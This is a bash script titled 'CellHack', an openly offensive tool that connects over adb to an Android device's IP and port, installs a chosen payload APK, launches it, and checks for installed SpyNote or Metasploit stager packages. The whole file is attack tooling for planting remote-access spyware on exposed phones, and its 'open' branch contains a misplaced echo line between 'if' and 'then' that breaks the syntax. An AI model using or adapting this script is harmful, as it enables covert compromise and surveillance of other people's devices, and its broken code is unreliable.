#!/bin/bash
day=$(date +%d/%m/%y )
echo -e "\e[1;32m┌─┐┌─┐┬  ┬  ┬ ┬┌─┐┌─┐┬┌─
│  ├┤ │  │  ├─┤├─┤│  ├┴┐
└─┘└─┘┴─┘┴─┘┴ ┴┴ ┴└─┘┴ ┴\e[0m"
if [ -x /bin/adb ]
then
if [[ $1 == "cell" ]]
then
	if [[ $# == "4" ]]
	then
		echo -e "\e[32m[INFO] $day $(date | awk '{print $4}') - CellHack by l1qxor"; sleep 1
		echo -e "\e[32m[INFO] $day $(date | awk '{print $4}') - Ip successfully obtained"; sleep 1
		echo -e "\e[32m[INFO] $day $(date | awk '{print $4}') - Port successfully obtained"; sleep 1
		echo -e "\e[32m[INFO] $day $(date | awk '{print $4}') - Paylaod successfully obtained"; sleep 1
		echo -e "\e[32m[INFO] $day $(date | awk '{print $4}') - Disconnect always connection"; sleep 1
		adb disconnect
		echo -e "\e[32m[INFO] $day $(date | awk '{print $4}') - Getting connection"
		adb connect $2:$3
		echo -e "\e[32m[INFO] $day $(date | awk '{print $4}') - Installing Paylaod"
		adb install -r $4
	else
		echo -e "\e[32mcellhack: \e[2mhelp\e[0m"	
	fi
elif [[ $1 == "open" ]]
then
	if [[ $# == "2" ]]
		echo -e "\e[32m[INFO] $day $(date | awk '{print $4}') - Opening payload"; sleep 1

	then
		echo -e "\e[32m[INFO] $day $(date | awk '{print $4}') - Opening payload"; sleep 1
		adb shell monkey -p $2 -c android.intent.category.LAUNCHER 1
	else
		echo -e "\e[32mcellhack: \e[2mhelp\e[0m"	
	fi
elif [[ $1 == "view" ]]
then
	if [[ $# == "4" ]]
	then
		adb disconnect > /dev/null 2>&1 &
		adb connect $2:$3 > /dev/null 2>&1 &
		if [[ $4 == "spynote" ]]
		then
			echo -e "\e[32m[INFO] $day $(date | awk '{print $4}') - Check if the payload"; sleep 1
			cmf=$(adb shell pm list packages | grep "cmf0" | tr ":" " " | awk '{print $2}')
			echo -e "\e[32m[INFO] $day $(date | awk '{print $4}') - the payload is $cmf" # " " is not payload
		elif [[ $4 == "metasploit" ]]
		then
			echo -e "\e[32m[INFO] $day $(date | awk '{print $4}') - Check if the payload"; sleep 1
			mts=$(adb shell pm list packages | grep "com.metasploit.stage" | tr ":" " " | awk '{print $2}')
			echo -e "\e[32m[INFO] $day $(date | awk '{print $4}') - the payload is $mts" # " " is not payload
		else
			echo -e "\e[32mcellhack: \e[2mhelp\e[0m"
		fi
	else
		echo -e "\e[32mcellhack: \e[2mhelp\e[0m"
	fi
elif [[ $1 == "help" ]]
then
	echo -e "\e[32mcellhack: \e[2mcell\e[0m {\e[2mip\e[0m} {\e[2mport\e[0m} {\e[2mpaylaod\e[0m}"
	echo -e "\e[32mcellhack: \e[2mopen\e[0m {\e[2mpackage_name\e[0m} "
	echo -e "\e[32mcellhack: \e[2mview\e[0m {\e[2mip\e[0m} {\e[2mport\e[0m} {\e[2mspynote/metasploit\e[0m} "
else
	echo -e "\e[32mcellhack: \e[2mhelp\e[0m"
fi
else
echo -e "\e[32mYou must install adb in your terminal!\e[0m"
fi